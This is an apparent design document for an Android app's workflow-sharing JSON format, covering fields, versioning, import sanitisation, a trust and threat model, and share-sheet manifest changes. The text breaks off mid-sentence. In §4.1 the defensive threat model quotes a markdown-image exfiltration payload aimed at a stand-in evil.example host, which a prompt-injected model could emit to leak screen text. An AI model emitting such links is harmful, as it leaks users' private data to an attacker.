# Sharing a workflow as a file — current state, what breaks, and the canonical shape

> **Status: partly built.** Items **0, 1 and 2** of the checklist in §7 have shipped — the
> `coerceInputValues` fix, the single declaration of the format, and `WorkflowBundleRepository`
> carrying the sanitisation table of §4.5. Items **3–6** are still proposals waiting on the
> decisions in §8, and the import review sheet (item 3) is the one that makes this feature safe.
>
> **§1 and §2 describe the tree before items 1–2, and are kept as the reasoning that produced
> them.** The two divergent declarations they anatomise no longer exist, and every citation they
> make into `feature/discover/.../WorkflowBundle.kt` points at a file that has been deleted. §6 is
> the shape that was actually built; read it first if you want the current state.

Everything below was read from the tree at `main` / `5fd94ed`. Every claim carries a `file:line`.
Where the brief's premise turned out to be wrong, I say so.

---

## 0. Three corrections to the brief, up front

1. **There *is* a version field.** `WorkflowBundle.version: Int = 1` is declared in both copies —
   `core/data/.../seed/StarterWorkflows.kt:21` and `feature/discover/.../WorkflowBundle.kt:20`. It
   is never read anywhere (grep for `bundle.version` / `.version` across both modules returns zero
   hits), and — see §1.4 — it is never *written* into an exported file either. So the field exists
   on paper only. The proposal in §3 is therefore "make the existing field work", not "add one".

2. **The format carries no `id` at all**, so id collisions are structurally impossible.
   `WorkflowSpec` is deliberately `Workflow` minus `id`, `createdAt`, `updatedAt`
   (`StarterWorkflows.kt:14-19`). The collision that actually exists is on **name** — see §2.4.

3. **The export file is not called `.arcx.json`.** It is `arcx-workflows.json`
   (`DiscoverViewModel.kt:27`), written as `application/json` (`DiscoverRoute.kt:114`). Nothing in
   the repo mentions `.arcx.json`. Adopting that name is a real (welcome) change, not the status
   quo — §5.

---

## 1. The format as it exists today

### 1.1 The two declarations

> **Historic.** Item 1 collapsed these into one: `WorkflowSpec` is now
> `core/model/.../WorkflowSpec.kt`, and the envelope, the `Json` and all three mappers are
> `core/data/.../bundle/WorkflowBundle.kt`. `:feature:discover` declares and parses nothing and no
> longer depends on kotlinx-serialization. The table below is *why*, not *what*.

| | `:core:data` | `:feature:discover` |
|---|---|---|
| File | `core/data/src/main/kotlin/com/arcx/core/data/seed/StarterWorkflows.kt` | `feature/discover/src/main/kotlin/com/arcx/feature/discover/WorkflowBundle.kt` |
| `WorkflowBundle` | `:20-24`, public | `:18-22`, `internal` |
| `WorkflowSpec` | `:26-43`, public | `:25-42`, `internal` |
| `icon` default | `"auto_awesome"` (`:29`) | `"✨"` (`:28`) |
| Json config | `ignoreUnknownKeys`, `coerceInputValues` (`:79-82`) | the same, plus `prettyPrint` (`:45-52`) |
| `toWorkflow` | `:45-65` — takes `now` + explicit `id`; **copies `providerId`, `isPinned`, `isFavorite`, `isBuiltIn` straight through** | `:55-72` — `id = ""`, forces `isPinned/isFavorite/isBuiltIn = false`; **still copies `providerId`** (`:64`) |
| `toSpec` (export) | — | `:78-94` — nulls `providerId` (`:85`), forces `isBuiltIn = false` (`:92`), **keeps `isPinned`/`isFavorite`** (`:90-91`) |
| Consumers | `readStarterWorkflows` → `WorkflowRepositoryImpl.installNewBuiltIns` (`WorkflowRepositoryImpl.kt:82`) | gallery read (`DiscoverViewModel.kt:107-122`), import (`:173-200`), export (`:202-226`) |

The 15 fields are identical in name, type and order in both. Only `icon`'s default differs.

*(Line numbers for the two Json configs are post-item-0; they were `:68` and `:45-48` before.)*

### 1.2 Every field

Types and defaults are the same in both declarations except where noted. The `Workflow` these map
onto is `core/model/.../Workflow.kt:10-35`.

| Field | Type | Default | Authoritative declaration | Notes |
|---|---|---|---|---|
| `name` | `String` | *required* | either | Import rejects blank (`DiscoverViewModel.kt:183`). No length cap anywhere. |
| `icon` | `String` | **disputed** — `"auto_awesome"` vs `"✨"` | **`:core:data`** | `"auto_awesome"` matches both `Workflow.icon`'s default (`Workflow.kt:17`) and `DEFAULT_WORKFLOW_ICON` (`WorkflowIcons.kt:64`). Discover's `"✨"` is a leftover from before the icon set. See §2.3. |
| `category` | `WorkflowCategory` | `CUSTOM` | either | 8 values, `Workflow.kt:66-76`. Drives tint (`DiscoverRoute.kt:347`) and library grouping. |
| `input` | `InputSource` | `SELECTED_TEXT` | either | 11 values, `Workflow.kt:38-51`. **The trust-relevant field.** |
| `prompt` | `String` | *required* | either | Import rejects blank (`DiscoverViewModel.kt:183`). |
| `systemPrompt` | `String?` | `null` | either | |
| `providerId` | `String?` | `null` | **`:feature:discover`'s export semantics** (always null) | See §2.1. |
| `model` | `String?` | `null` | either | See §2.2. |
| `output` | `OutputTarget` | `BOTTOM_SHEET` | either | 8 values, `Workflow.kt:54-64`. |
| `temperature` | `Float?` | `null` | either | Straight to `AiRequest` (`ExecuteWorkflowUseCase.kt:141`). |
| `maxTokens` | `Int?` | `null` | either | Straight to `AiRequest` (`:142`). Unbounded. |
| `isPinned` | `Boolean` | `false` | **`:feature:discover`'s import** (force false) | Export keeps it (`WorkflowBundle.kt:90`), import drops it (`:68`). Asymmetric. |
| `isFavorite` | `Boolean` | `false` | **`:feature:discover`'s import** (force false) | Same asymmetry (`:91` vs `:69`). |
| `isBuiltIn` | `Boolean` | `false` | **`:feature:discover`** (force false both ways) | `:core:data`'s pass-through (`StarterWorkflows.kt:61`) is correct *for seeding only*. See §2.5. |
| `sortOrder` | `Int` | `0` | neither — nobody sanitises it | Passed through on both paths (`WorkflowBundle.kt:71`, `:93`). Orders every library query (`Daos.kt:13-19`). |

Envelope: `version: Int = 1`, `workflows: List<WorkflowSpec>`.

### 1.3 The same envelope ships three things

- `core/data/src/main/assets/starter_workflows.json` — 16 entries, `"version": 1`. Keys used:
  `category, icon, input, isBuiltIn, isPinned, name, output, prompt, sortOrder, systemPrompt,
  temperature`. Inputs present: `CLIPBOARD`, `SCREENSHOT`, `SELECTED_TEXT`.
- `feature/discover/src/main/assets/gallery.json` — 12 entries, `"version": 1`. Same keys minus
  `isBuiltIn`/`isPinned`. Inputs: `CLIPBOARD`, `MANUAL`, `SELECTED_TEXT`.
- The user's export.

Neither asset sets `providerId` or `model` (grep count: 0 in both). Every entry in both files sets
`icon` explicitly — which matters for the migration in §6.

### 1.4 What an export actually looks like — and the surprise in it

Neither `Json` config sets `encodeDefaults`, and kotlinx's default is `false`. **Any field equal to
its default is not written.** Since `WorkflowBundle.version` always equals its default of `1`, *the
exported file has no `version` key at all*. The two bundled assets have one only because they were
typed by hand.

Here is the real output of `DiscoverViewModel.export` (`:202-226`) for the `Explain This Screen`
starter, which is in `starter_workflows.json` today:

```json
{
    "workflows": [
        {
            "name": "Explain This Screen",
            "icon": "visibility",
            "category": "PRODUCTIVITY",
            "input": "SCREENSHOT",
            "prompt": "Explain what this screen is showing.\n\nOpen with one sentence naming the app or page and what it is for. Then, if there is anything here the user is likely to be stuck on — an error, a warning, a permission request, an unfamiliar setting, a form to fill in — say what it means and what to do about it.\n\nIf the screen is mainly something to read, give the gist of it instead. Mention layout, colours or icons only when they are the point. If part of the screen is unreadable, say so rather than guessing.\n\nKeep it under about 80 words, in the language on the screen.",
            "systemPrompt": "You are looking at a screenshot of the user's phone screen. You explain what they are looking at in plain language, the way a knowledgeable friend would, and you never invent detail that is not visible in the image.",
            "temperature": 0.3,
            "isPinned": true,
            "sortOrder": 16
        }
    ]
}
```

Note what is missing and why: no `version` (equals default), no `output` (`BOTTOM_SHEET` equals
default, even though the asset spells it out), no `providerId` (nulled by `toSpec`), no
`model`/`maxTokens`/`isFavorite`/`isBuiltIn` (all defaults). Field order follows declaration order,
so `prompt` precedes `systemPrompt`. Indentation is kotlinx's 4-space `prettyPrint`.

This one workflow is also the worst case for trust: it photographs the screen, and it arrives
pre-pinned.

---

## 2. What breaks once the file leaves the device

### 2.1 `providerId` — a dangling reference that fails silently

**Does an export reference a local-only provider id?** No. `Workflow.toSpec()` sets
`providerId = null` (`WorkflowBundle.kt:85`), with the comment at `:74-77` stating exactly this
reasoning. Export is already correct.

**Can a bundle carry one anyway?** Yes. Import does *not* strip it — `WorkflowBundle.kt:64` is
`providerId = providerId`. A hand-written or third-party file can set any string.

**What happens when it does not resolve?** Nothing visible. Trace:

- `ExecuteWorkflowUseCase.kt:56` → `providers.resolve(workflow.providerId)`
- `ProviderRepositoryImpl.kt:27-30`:
  ```kotlin
  override suspend fun resolve(providerId: String?): ProviderConfig? {
      providerId?.let { id -> get(id)?.let { return it } }
      return settings.current().defaultProviderId?.let { get(it) }
  }
  ```
  An unknown id falls through to the user's default. **It is not an error and there is no log line.**
- Only if there is *also* no default does `config == null` and `ExecuteWorkflowUseCase.kt:57-63`
  emit `AiError.NoProvider` — "No AI provider configured yet" (`Ai.kt:48-49`), which is a
  misleading message for "the file named a provider you don't have".

Provider ids are random UUIDs minted per device (`ProviderEditViewModel.kt:194`,
`OnboardingViewModel.kt:40`), so an imported id is a dangling reference with probability ~1.

**Consequence:** the workflow runs — correctly, against the importer's default — but the editor
shows it pinned to a provider that does not exist (`WorkflowEditorViewModel.kt:202-206` will render
a selection with no matching row). Not dangerous, quietly wrong.

**Recommendation:** strip on import, exactly as export already does.

> **Done (item 2).** `sanitisedForImport()` nulls `providerId` on every path in, so the dangling
> reference and the editor showing a provider that does not exist are both gone. The rest of this
> section is the reasoning, and the `ProviderRepositoryImpl` fall-through it describes is unchanged.

### 2.2 `model` — a wasted round trip and an unhelpful error

`ExecuteWorkflowUseCase.kt:65`: `val model = workflow.model ?: config.defaultModel`. The string is
passed verbatim into `GeminiProvider` (`GeminiProvider.kt:74`, `modelFor` at `:122-123`), which puts
it in the request path.

A model the importer's provider does not offer returns 404, mapped by `GeminiProvider.kt:136-143` to
`AiError.Server(404, body)` → the sheet shows **"Provider returned HTTP 404"** (`Ai.kt:42-43`). No
inference is billed (the 404 precedes generation), but the user gets an HTTP code where they need
"this workflow asks for a model your account doesn't have".

Second failure mode: vision. `SCREENSHOT` workflows need a vision-capable model. The editor warns
via `modelWithoutVision` against `ModelInfo.supportsVision` (`WorkflowEditorViewModel.kt:87-92`,
`Provider.kt:41-45`). **The import path has no equivalent check** — an imported screenshot workflow
pinned to a text-only model fails at run time with a provider error.

**Recommendation:** strip `model` on import by default, and show the author's choice as text ("The
author used `gemini-2.0-flash`") rather than applying it. Flagged as a product decision in §8.

### 2.3 `icon` — the Discover default reintroduces exactly what a migration removed

Rendering, per `WorkflowIcon.kt:41-54`:
- key in `WorkflowIcons` → Material vector, tinted by category
- anything else → **drawn as literal text** at `size * 0.45f` sp (`:50-53`)
- blank → `"✨"`

`workflowIconFor` returns `null` for unknown keys and deliberately does *not* fall back to the
default (`WorkflowIcons.kt:156-161`). Shortcuts and the widget do the same thing via
`WorkflowIconBitmap.draw` (`WorkflowIconBitmap.kt:62-69` → `drawEmoji` at `:116-127`).

So:

- **A bundle carrying an emoji** (`"icon": "🍳"`) renders as 🍳 everywhere, including the launcher
  shortcut. **This is correct and intended** — `CLAUDE.md` and the `MIGRATION_2_3` comment
  (`Migrations.kt:20-28`) both say a user's own emoji must survive.
- **An unknown key** (`"icon": "sparkles_v2"`) renders as the literal string `sparkles_v2` inside a
  38dp tile (`DiscoverRoute.kt:438-443`) and inside an adaptive launcher icon. Legible-ish at 52dp
  in the detail sheet, garbage at 34dp on a start-here card.
- **A bundle that omits `icon`**, imported through Discover, stores the literal string `"✨"` in
  Room — an emoji, which is precisely what `MIGRATION_2_3` was written to eliminate, and that
  migration is a one-shot 2→3 step (`Migrations.kt:29`) that will never clean it up. The *same file*
  read through `:core:data` would get `"auto_awesome"` and draw as a vector. This is the sharpest
  consequence of the duplicate declaration.

**Recommendation:** one default, `DEFAULT_WORKFLOW_ICON` (`WorkflowIcons.kt:64`). On import, coerce
a missing/blank icon to it; leave any non-empty value untouched (emoji included). Optionally cap
icon length so a 500-char "icon" can't be drawn as text.

> **Done (item 1), except the length cap.** There is one `DEFAULT_WORKFLOW_ICON` literal, in
> `:core:model` and re-exported from `:core:designsystem` so existing imports still resolve, and
> `sanitisedForImport()` coerces a blank icon to it while leaving any non-empty value — emoji
> included — completely alone. The unknown-key and long-string cases in the bullets above are
> unchanged; nothing caps icon length.

### 2.4 There are no id collisions — the collision is on `name`

`WorkflowSpec` has no `id` field (`StarterWorkflows.kt:27-43`), by design (`:14-19`). Import sets
`id = ""` (`WorkflowBundle.kt:56`) and `SaveWorkflowUseCase.kt:17` mints a fresh UUID. Room's PK is
`id` (`Entities.kt:14`). Importing the same file twice therefore yields two rows, which is
deliberate and documented (`WorkflowBundle.kt:50-54`).

The real name-keyed behaviours it collides with:

- **Discover's "Added" state** is matched by name (`DiscoverViewModel.kt:38-41`, computed at `:126`;
  rows keyed on `spec.name` at `DiscoverRoute.kt:238`). An imported workflow named the same as a
  gallery entry makes that entry read "Added" permanently, even though it is a different workflow.
- **Starter seeding** dedupes by name against a persisted set (`WorkflowRepositoryImpl.kt:81-100`,
  `SEEDED_STARTERS` at `:103`). Imported names never enter that set, so importing something called
  "Fix Grammar" does not suppress a future starter of the same name — you get two rows with
  identical names, indistinguishable in every list.
- **Nothing dedupes imports against the existing library.** `import` at `DiscoverViewModel.kt:192`
  is `imported.forEach { saveWorkflow(it.toWorkflow()) }` — unconditional.

**Recommendation:** show the collision in the import sheet ("You already have a workflow called
*Fix Grammar*") and let the user choose. The default should stay "keep both" — it matches the
existing documented behaviour and is the non-destructive choice. Which options to offer is a
product decision (§8).

### 2.5 Fields that are meaningless or unsafe off-device

| Field | Verdict |
|---|---|
| `providerId` | **Meaningless** — names a local Room row. §2.1 |
| `isBuiltIn` | **Unsafe.** Built-ins are read-only in the library — the menu offers only "Duplicate to edit" (`WorkflowListRoute.kt:470`) instead of Edit. A bundle asserting `isBuiltIn: true` would pose as first-party ArcX content *and* be uneditable. Currently blocked by both discover mappers (`WorkflowBundle.kt:70`, `:92`) — but `:core:data`'s mapper passes it through (`StarterWorkflows.kt:61`), so the type permits it. Any future consolidation that loses the discover override reopens this. |
| `isPinned` | **Unsafe-ish.** Pinned workflows surface on Home (`HomeViewModel.kt:228`) and in the widget (`Daos.kt:19`). A bundle can pin itself onto the importer's home screen. Import already forces false (`WorkflowBundle.kt:68`) — but export keeps it (`:90`), so the field travels and only the current import code stops it. |
| `isFavorite` | Same, `Daos.kt:16` / `:91` vs `:69`. |
| `sortOrder` | **Unsafe and not sanitised today.** Every library query orders by it (`Daos.kt:13-19`), and both mappers pass it through (`WorkflowBundle.kt:71`, `:93`). `"sortOrder": -999999` floats an imported workflow above everything the user made. |
| `maxTokens` | **Unbounded.** Goes straight to `AiRequest` (`ExecuteWorkflowUseCase.kt:142`). A bundle can request a million tokens against the importer's key. |
| `name`, `prompt`, `systemPrompt` | Safe in content, **unbounded in size**. No length check anywhere; only blankness is checked (`DiscoverViewModel.kt:183`). A 50MB prompt goes into Room and then into every list query. |
| `temperature` | Safe. |
| `category`, `input`, `output` | Safe as data — but see §4.3 for the *combinations*. |

> **The five "strip" verdicts are enforced as of item 2** — `sanitisedForImport()`, once, in the
> module that owns the format. The consolidation this table warned about ("any future consolidation
> that loses the discover override reopens this") is the consolidation that happened: it kept two
> mappers named as opposites, `toWorkflowAsStarter` and `toWorkflowAsImport`, and a test fails if
> anyone collapses them. `maxTokens` and the three size limits are still unbounded, as above.

---

## 3. Versioning

### 3.1 What is broken today

- `version` exists (`StarterWorkflows.kt:21`, `WorkflowBundle.kt:20`), is never read, and is never
  written to exports (§1.4).
- The only validity check on import is "does it happen to deserialize"
  (`DiscoverViewModel.kt:182`). Any JSON with a `workflows` array of objects carrying `name` and
  `prompt` imports successfully. There is no marker saying "this is an ArcX file".
- **`ignoreUnknownKeys` did not do what both comments claimed.** They said "a file written by a
  newer build still imports on an older one". That held for unknown *keys*. It did **not** hold for
  unknown *enum values*: a bundle containing `"input": "VIDEO"` — a plausible future addition to
  `InputSource` — threw `SerializationException`, `runCatching` caught it, and the user saw **"That
  does not look like an ArcX workflow file"** (`DiscoverViewModel.kt:196`) for a file that was 95%
  importable, with every other workflow in it lost too.

  **This is item 0 and it is fixed.** `coerceInputValues = true` is now set on both configs, both
  comments say what is actually true, and `WorkflowBundleTest` pins the behaviour.

### 3.2 The minimal proposal

Two fields on the envelope, one encoder flag.

```json
{
  "kind": "arcx.workflows",
  "version": 1,
  "workflows": [ … ]
}
```

- **`kind: String = "arcx.workflows"`** — makes "is this ours?" a check rather than a guess, and
  turns the generic parse failure into two distinct, actionable messages. Must be **optional on
  read** (absent = accept) or the two bundled assets and every file exported by today's build stop
  importing.
- **`version: Int`**, actually written. Either set `encodeDefaults = true` on the encoder or make
  the field non-defaulted at the construction site.
- **`coerceInputValues = true` on the decoder** — done, item 0. Unknown enum values now fall back to
  the property's default instead of killing the file. Every enum field here has a default
  (`CUSTOM`, `SELECTED_TEXT`, `BOTTOM_SHEET`), and the defaults happen to be the safe direction: an
  unrecognised input source degrades to `SELECTED_TEXT`, the *least* invasive source, and an
  unrecognised output degrades to `BOTTOM_SHEET`, which just shows the answer.
- Keep `ignoreUnknownKeys = true` on the decoder.

### 3.3 What old ArcX does when it meets a newer bundle

**Import what it understands. Warn. Never refuse on version alone.**

| Situation | Behaviour |
|---|---|
| `kind` absent, or `= "arcx.workflows"` | Proceed |
| `kind` present and different | Refuse: "That file was made by a different app." |
| `version <= MAX_SUPPORTED` | Import silently |
| `version > MAX_SUPPORTED` | Import anyway. Banner in the review sheet: "This file was made by a newer version of ArcX. Anything it added has been left out." |
| Unknown key on a workflow | Dropped by `ignoreUnknownKeys`. No message — this is the normal additive case. |
| Unknown enum value | Coerced to the field default, and **named in the review sheet** ("This workflow uses an input ArcX doesn't recognise; it will read your selected text instead"). Coercion changes what the workflow reads, so it must not be silent. |
| Malformed JSON / missing `workflows` | Refuse with today's message |
| A workflow with blank `name` or `prompt` | Skip that entry, keep the rest (already the behaviour, `DiscoverViewModel.kt:183`) |

**Safe to ignore, forever:** anything additive — new optional fields, new enum members, new
metadata. That is the entire expected shape of future change.

**Not safe to ignore, and the only reason to ever bump the major version:** a change to the
*meaning* of `prompt`, `input`, or `output`. Those three decide what the workflow reads and where
the answer goes; a reader that misinterprets them produces something wrong rather than merely
incomplete. If that day comes, refuse. Until then, one integer that only ever gates a warning string
is the whole mechanism, and that is correct for a JSON file that a person emails to a friend.

---

## 4. Trust

### 4.1 Can a bundle cause data to reach a third party the importer did not choose?

**No. Not today, and it is structurally prevented, not accidentally absent.** Six independent
reasons:

1. **`WorkflowSpec` has 15 fields and none of them is a URL, a host, a header, or a
   `ProviderConfig`** (`StarterWorkflows.kt:27-43`, `WorkflowBundle.kt:26-42`). There is no field a
   destination could hide in.
2. **`ProviderConfig` cannot travel.** It is `id, type, label, baseUrl, defaultModel, streaming,
   createdAt` (`Provider.kt:30-38`). Neither bundle serializer has a field of that type, nor any
   nested object at all — `workflows: List<WorkflowSpec>` is the envelope's only member.
   **`baseUrl` therefore cannot appear in a bundle.**
3. **`providerId` is inert.** It is a `String` resolved only against the local Room table
   (`ProviderRepositoryImpl.kt:27-30` → `ProviderDao`). It cannot create a provider, cannot carry a
   URL, and an unknown value silently yields the importer's own default (§2.1).
4. **`ignoreUnknownKeys = true`** (both configs) discards any extra key an attacker adds before it
   can reach a field.
5. **The destination of every request is the importer's own row.** `ExecuteWorkflowUseCase.kt:149`
   is `provider.generate(request, config, apiKey)` where `config` came from `providers.resolve(...)`
   — a local read. There is exactly one execution path, so there is no second place to check.
6. **The output renderer cannot fetch anything.** `MarkdownText` handles fenced code, headings,
   bullets, and inline bold/italic/code — nothing else (`MarkdownText.kt:100-102`, `:158`). **No
   images, no links, no network.** This closes the classic exfiltration channel where a crafted
   prompt makes the model emit `![](https://evil.example/?d=<screen text>)` and the renderer
   fetches it. That channel does not exist here, and `MarkdownText.kt:25-32` should keep saying
   "deliberately hand-rolled" for this reason as well as the stated one.

The app's only network permission is `INTERNET` (`app/src/main/AndroidManifest.xml:4`), used by the
single OkHttp stack in `:core:ai`.

So the honest threat model is **not exfiltration to an attacker's server**. It is *misdirection of
the importer's own resources*: a prompt they did not write, running against their key, over input
they may not realise it reads.

### 4.2 Does the API key travel?

**No.** Proof from the code, in order of strength:

1. **The key is not in the type being serialized.** `Workflow` (`Workflow.kt:10-35`) has no key
   field; `WorkflowSpec` is a strict subset of it.
2. **The key is not in the database at all.** `ProviderEntity`'s comment (`Entities.kt:38`) and
   `ProviderConfig`'s (`Provider.kt:25-28`) both state it; `KeystoreVault` is the only holder, keyed
   by provider id (`ProviderRepositoryImpl.kt:51-53`).
3. **The export function never reads a key or a provider.** `DiscoverViewModel.export`
   (`:202-226`) is:
   ```kotlin
   val all = workflows.observeAll().first()                        // :206  List<Workflow>
   val bundle = WorkflowBundle(workflows = all.map { it.toSpec() }) // :207
   ```
   `workflows` is a `WorkflowRepository` (`Repositories.kt:11-27`) — it has no provider or key
   method. **`DiscoverViewModel` does not inject `ProviderRepository` or `KeystoreVault` at all**
   (constructor at `:87-92`: `Context`, `WorkflowRepository`, `SaveWorkflowUseCase`, dispatcher).
   There is no code path from export to the vault.
4. **Belt and braces:** `toSpec` nulls `providerId` (`WorkflowBundle.kt:85`), so an export does not
   even name the vault entry.

The key does not travel, and it could not travel without adding a dependency that currently does not
exist.

### 4.3 The two things that *are* dangerous, which generic advice misses

**(a) The prompt can read the screen even when `input` does not say so.**

`ExecuteWorkflowUseCase.kt:133-135` computes the variable set from the *prompt text*, then
`ResolveWorkflowInputUseCase.kt:80` resolves `{{screen_text}}` via the accessibility service. A
workflow declared `"input": "SELECTED_TEXT"` whose prompt happens to contain `{{screen_text}}` reads
the whole screen.
Its Discover detail row would read "Selected text → Bottom sheet"
(`DiscoverRoute.kt:456-459`), which is true and completely misleading.

Worse, `ResolveWorkflowInputUseCase.text` (`:35-54`) means almost every text workflow can end up
reading the screen anyway: for `SELECTED_TEXT` and `SHARE_INTENT`, a launch that carries no text —
bubble, shortcut, tile, widget — falls back to the clipboard and *then* to screen text (`:45-47`).

**A warning computed from the `input` enum alone is wrong.** It must be computed from `input`
**plus** `PromptTemplate.variablesIn(prompt) + variablesIn(systemPrompt)`.

**(b) Certain input/output *combinations* move screen content outward, and neither field is alarming
alone.**

- `SCREEN_TEXT` → `REPLACE_SELECTION`: the answer, derived from everything on screen, is typed back
  into whatever field the user had selected text in (`OutputApplier.kt:125-131`, returned via
  `setResult` at `RunnerActivity.kt:76-81`). If that field is an outgoing message, screen content
  leaves the device through the user's own send button.
- `SCREEN_TEXT` → `CLIPBOARD`: written to the system clipboard with no confirmation
  (`OutputApplier.kt:119-123`). Any foreground app can read it.
- `SCREEN_TEXT` / `SCREENSHOT` → `NOTIFICATION`: up to 4,000 characters posted to the shade
  (`OutputApplier.kt:46`, `:190`), visible on a lock screen.

`SHARE` opens a chooser (`:133`) and `SAVE_MARKDOWN`/`SAVE_PDF` go through SAF (`:135-143`), so
those are user-mediated and fine.

None of these is exfiltration to the bundle's author. All of them are surprising. The import sheet
should name the combination in one sentence, not enumerate eleven input sources.

### 4.4 What the import screen must show before the user accepts

Today, **nothing is shown before the write.** `import` (`DiscoverViewModel.kt:173-200`) parses and
installs in the same expression (`:192`), then shows a snackbar afterwards. The decision point does
not exist.

Add an **import review sheet**. `GalleryDetailSheet` (`DiscoverRoute.kt:519-566`) is 90% of it
already — icon, name, category, `input → output`, system prompt, full prompt, one confirming button.
Additions, in priority order:

1. **A one-sentence capability line at the top, in the largest text on the sheet**, computed from
   `input` + prompt variables + output. It must name the importer's *own* provider — resolve
   `ProviderRepository.resolve(null)` and use `config.label` — because that is where the data
   actually goes, and naming it is reassuring rather than alarming:
   - `SCREENSHOT` → **"This workflow photographs your screen and sends the picture to Gemini."**
   - `SCREEN_TEXT`, or `{{screen_text}}` anywhere in either prompt → **"This workflow reads the text
     on your screen and sends it to Gemini."**
   - `CLIPBOARD`, or `{{clipboard}}` → **"This workflow reads whatever you have copied and sends it
     to Gemini."**
   - otherwise → **"This workflow sends the text you select to Gemini."**
   - and, when the launch-surface fallback applies (`input` ∈ {`SELECTED_TEXT`, `SHARE_INTENT`}),
     one extra line: *"Launched from the bubble or a shortcut, it will use your clipboard, or the
     text on screen, if nothing is selected."*
2. **A second line for the outward-facing outputs** — `REPLACE_SELECTION` ("the answer is typed back
   into whatever you were writing"), `CLIPBOARD` ("the answer replaces what you have copied"),
   `NOTIFICATION` ("the answer appears in your notifications").
3. **The full prompt and system prompt, verbatim, scrollable.** This is the only real defence
   against a prompt-injection payload, and it is already built (`DiscoverRoute.kt:549-556`).
4. **What was stripped**, as one quiet line: "Provider, pinning and ordering come from your
   settings, not from this file." It is short, it is true, and it is the sentence that makes a
   stripped field feel like care rather than a missing feature.
5. **Name collisions** (§2.4) and any **coerced enum values** (§3.3), when present.
6. **Per-workflow checkboxes** when the file holds more than one, defaulting to all checked.

Then: **Import** / **Cancel**.

### 4.5 The recommendation in one table

| | Decision |
|---|---|
| **Allow through** | `name`, `icon`, `category`, `input`, `prompt`, `systemPrompt`, `output`, `temperature` |
| **Strip on import** | `providerId` → `null`; `isBuiltIn` → `false`; `isPinned` → `false`; `isFavorite` → `false`; `sortOrder` → `0` |
| **Clamp** | `maxTokens` to a ceiling; `name` length; total `prompt` + `systemPrompt` size; whole-file size before parsing |
| **Coerce** | missing/blank `icon` → `DEFAULT_WORKFLOW_ICON`; unknown enum values → field default (done, item 0) |
| **Product decision** | `model` — strip, keep, or show as a suggestion (§8) |
| **Surface in UI** | the capability sentence, the output sentence, both prompts in full, what was stripped, name collisions, coerced values, newer-version banner |

**The "strip" row is done, as item 2.** It is `WorkflowSpec.sanitisedForImport()` in
`core/data/.../bundle/WorkflowBundle.kt` — a property of the format's owner rather than of one mapper
in one feature module — applied by the repository on every path in, imported file and bundled gallery
alike, and again by `toWorkflowAsImport` as the last thing between a file and Room.

Two of the five were genuinely new rather than moved: `sortOrder` was sanitised nowhere, and
`providerId` was copied straight through on import (§2.1). An earlier version of this paragraph said
only `sortOrder` was missing, which was one short.

One visible consequence: gallery installs share the import mapper, so a gallery entry now arrives at
`sortOrder` 0 instead of carrying its position in `gallery.json`. That is the rule applied
consistently; exempting the gallery would mean weakening the mapper.

"Clamp", and whether `model` survives at all, are deliberately untouched — §8, not refactoring.

---

## 5. Sharing UX

### 5.1 Where it stands

- Export: SAF `CreateDocument("application/json")` (`DiscoverRoute.kt:113-115`), whole library only,
  named `arcx-workflows.json` (`DiscoverViewModel.kt:27`), reachable from Discover's ⋮ menu
  (`DiscoverRoute.kt:284-291`).
- Import: SAF `OpenDocument` accepting `application/json`, `text/plain`, `application/octet-stream`
  (`:109-111`, `:128-130`) — three mimes because pickers report `.json` inconsistently (`:107-108`).
- **No share sheet on either end. No `FileProvider` anywhere in the repo** — grep for `<provider`,
  `FileProvider`, `file_paths` returns nothing. `app/src/main/res/xml/` holds only
  `data_extraction_rules.xml` and `shortcuts.xml`.
- No per-workflow export exists; the library row menu offers Duplicate / Add to home screen / Delete
  (`WorkflowListRoute.kt:470-498`).

### 5.2 Sending — smallest change

**Manifest** (`app/src/main/AndroidManifest.xml`, inside `<application>`):

```xml
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="${applicationId}.files"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
               android:resource="@xml/file_paths" />
</provider>
```

**New file** `app/src/main/res/xml/file_paths.xml` with a single
`<cache-path name="shared" path="shared/" />`.

**Code:** write the bundle to `cacheDir/shared/<slug>.arcx.json`, wrap with
`FileProvider.getUriForFile`, and fire `Intent.createChooser(ACTION_SEND, type = "application/json",
EXTRA_STREAM = uri, FLAG_GRANT_READ_URI_PERMISSION)`. `OutputApplier.shareText`
(`OutputApplier.kt:161-170`) is the pattern to copy, including its `FLAG_ACTIVITY_NEW_TASK` comment.

**Why not just share the SAF Uri the export already produced:** an `ACTION_CREATE_DOCUMENT` grant is
issued to ArcX and is not re-grantable onward, so the chooser target would hit a
`SecurityException`. Cache + FileProvider is the standard answer and costs one XML file.

**Where it hangs in the UI:** "Share" belongs in the library row's overflow menu
(`WorkflowListRoute.kt:470-498`, next to "Add to home screen" at `:491`) — that is the screen where
a user is looking at *one* workflow. Discover's ⋮ keeps "Export my workflows" for the whole library.

**Which layer owns it:** the `SystemSurfaces` port (`SystemSurfaces.kt:14`), exactly like
`pinWorkflowShortcut` (`:90`). `CLAUDE.md` names this as the established way features reach Android
without a module dependency — and it is the reason `DiscoverViewModel`'s `@ApplicationContext`
injection (`DiscoverViewModel.kt:88`) is the odd one out in this codebase.

### 5.3 Receiving — manifest changes and touchpoints

**Do not add `application/json` to `RunnerActivity`'s existing `ACTION_SEND` filter**
(`AndroidManifest.xml:59-65`, currently `text/plain`, `image/*`, `application/pdf`).
`RunnerActivity` is the *run* path: `buildInput` would read the file as an attachment
(`RunnerActivity.kt:119-126` → `readAttachment` at `:141-150`) and post the user's own workflow file
into a prompt. Importing must land elsewhere.

**Add to `MainActivity`** (`AndroidManifest.xml:18-36`, already `exported="true"`):

```xml
<!-- Tapping a .arcx.json in Files, or a download in a browser. -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="content" android:mimeType="application/json" />
    <data android:scheme="file"    android:mimeType="application/json" />
</intent-filter>

<!-- "Share to ArcX" from a chat app or another ArcX. -->
<intent-filter>
    <action android:name="android.intent.action.SEND" />
    <category android:name="android.intent.category.DEFAULT" />
    <data android:mimeType="application/json" />
</intent-filter>
```

Add `text/plain` + `application/octet-stream` variants for the same reason the import picker already
accepts three mimes (`DiscoverRoute.kt:128-130`) — file managers and chat apps disagree about what a
`.json` is. Constrain those to a `pathPattern` ending in `.arcx.json` so ArcX does not offer itself
for every text file on the device.

**Code touchpoints:**

- `MainActivity` is `launchMode="singleTask"` (`AndroidManifest.xml:21`) and today **reads no intent
